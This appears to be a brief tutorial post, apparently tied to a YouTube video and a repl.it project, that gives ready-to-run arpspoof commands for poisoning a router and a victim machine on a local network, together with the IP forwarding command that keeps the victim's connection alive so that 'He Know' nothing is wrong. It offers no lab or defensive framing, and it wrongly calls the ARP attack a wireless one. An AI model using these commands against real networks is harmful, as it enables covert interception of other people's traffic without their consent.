Youtube Link PART1 :

ARP Spoofing is One of The Best Wireless Attack on Local Network . 

I AM ROUTER:

arpspoof -i eth0 -t 192.168.0.1 192.168.0.103

I AM Victim :

arpspoof -i eth0 -t 192.168.0.103 192.168.0.1

ENABLING PORT FORWARDING :

If you miss this step then the Victim Internet Will be Goes Off and He Know That Something is Wrong With Wireless Network

echo '1' > /proc/sys/net/ipv4/ip_forward

Check the Project Here 

https://repl.it/@AdilShehzad7/ARP-Spoofing
